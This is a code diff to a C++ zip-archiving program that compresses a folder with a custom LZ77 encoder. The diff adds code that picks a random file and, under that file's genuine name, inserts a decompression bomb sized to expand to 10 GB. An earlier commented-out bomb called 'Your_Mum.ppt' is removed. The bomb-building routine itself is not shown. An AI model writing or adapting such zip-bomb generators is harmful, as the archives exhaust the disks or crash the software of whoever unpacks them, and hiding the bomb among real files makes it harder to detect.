@@ -9,6 +9,8 @@
 
 #include <iostream>
 #include <filesystem>
+#include <random>
+#include <algorithm>
 
 namespace {
     enum class ByteSizeBaseKB:size_t {
@@ -17,24 +19,34 @@ namespace {
         TB = GB * 1024,
         PB = TB * 1024
     };
-}
 
-std::vector<uint8_t> readFile(const std::string &fileName) {
-    std::ifstream in(fileName, std::ios::binary | std::ios::ate);
-    if (!in) {
-        std::cout << "Input file failed to open \n";
-        return {};
+    size_t randomNumber(const size_t max) {
+
+        std::random_device rd;
+        std::mt19937_64 gen(rd());
+
+        return gen()%max;
     }
 
-    const long long fileSize { in.tellg()};
+    std::vector<uint8_t> readFile(const std::string &filePath) {
+        std::ifstream in(filePath, std::ios::binary | std::ios::ate);
+        if (!in) {
+            std::cout << "failed to open Input file : "<<filePath<<" \n";
+            return {};
+        }
 
-    std::vector<uint8_t> fileDate(fileSize);
-    in.seekg(0, std::ios::beg);
+        const long long fileSize { in.tellg()};
 
-    in.read(reinterpret_cast<char *>(fileDate.data()), fileSize);
+        std::vector<uint8_t> fileDate(fileSize);
+        in.seekg(0, std::ios::beg);
 
-    return fileDate;
+        in.read(reinterpret_cast<char *>(fileDate.data()), fileSize);
+
+        return fileDate;
+    }
 }
+
+
 
 int main() {
     try {
@@ -46,26 +58,32 @@ int main() {
         std::string folderName{"test"};
         ZipFile zipFile{zipFileName};
 
+        size_t fileCount { static_cast<size_t>(std::count_if(
+            fs::recursive_directory_iterator(folderName, fs::directory_options::skip_permission_denied),
+            fs::recursive_directory_iterator{},
+            [](const fs::directory_entry& e){ return e.is_regular_file(); }))};
+
+        size_t bombPlacement {randomNumber(fileCount)};
+
+        size_t nthFileRead{};
         for (const fs::directory_entry& entry : fs::recursive_directory_iterator(folderName,fs::directory_options::skip_permission_denied)) {
             if (is_regular_file(entry)) {
                 std::string fileName{entry.path().filename().string()};
-                Timer readFileTimer{"Compressing File - "+fileName};
+                if (nthFileRead == bombPlacement) {
+                    Timer readFileTimer{"Placing Bomb in File - "+fileName};
+                    LocalFileHeader bombFile {LocalFileHeader::createBomb(fileName, (static_cast<size_t>(ByteSizeBaseKB::GB) * 10))};
+                    zipFile.addFile(bombFile);
+                }else {
+                    Timer readFileTimer{"Compressing File - "+fileName};
+                    std::vector<uint8_t> fileData{readFile(entry.path().string())};
+                    LocalFileHeader compressedFileHeader { lz77::fixedCompress(fileName,fileData)};
+                    zipFile.addFile(compressedFileHeader);
+                }
 
-                std::vector<uint8_t> fileData{readFile(fileName)};
-                LocalFileHeader compressedFileHeader { lz77::fixedCompress(fileName,fileData)};
-                zipFile.addFile(compressedFileHeader);
             }
-
+            ++nthFileRead;
         }
 
-
-        // LocalFileHeader bombLfh{};
-        // {
-        //     Timer localHeaderBomb{"Creating local file header bomb"};
-        //     bombLfh = LocalFileHeader::createBomb("Your_Mum.ppt", (static_cast<size_t>(ByteSizeBaseKB::GB) * 11));
-        // }
-        //
-        // zipFile.addFile(std::move(bombLfh));
 
         {
             Timer zipFileSerialization{"Closing zip file"};
